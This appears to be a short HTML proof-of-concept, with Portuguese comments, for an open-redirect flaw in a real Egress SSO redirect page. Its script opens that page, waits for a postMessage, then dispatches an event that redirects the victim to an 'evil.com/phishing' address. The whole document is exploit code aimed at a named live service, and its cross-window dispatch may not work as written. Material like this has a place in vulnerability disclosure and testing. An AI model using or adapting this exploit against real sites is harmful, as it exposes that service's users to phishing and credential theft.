<!DOCTYPE html>
<html>
  <body>
    <h1>PoC de Open Redirect</h1>
    <button onclick="exploit()">Executar Redirect</button>

    <script>
      function exploit() {
        const targetWindow = window.open("https://uk.office.egress.com/sso/redirect.html?isWebClient=true", "_blank");

        // Aguarda a página vulnerável pedir a URI
        window.addEventListener("message", (event) => {
          if (event.data?.type === "ready-for-uri-redirect") {
            console.log("[*] Requisitado redirect, enviando payload...");

            targetWindow.dispatchEvent(
              new CustomEvent("invoke-uri-redirect", {
                detail: { uri: "https://evil.com/phishing" }
              })
            );
          }
        }, false);
      }
    </script>
  </body>
</html>
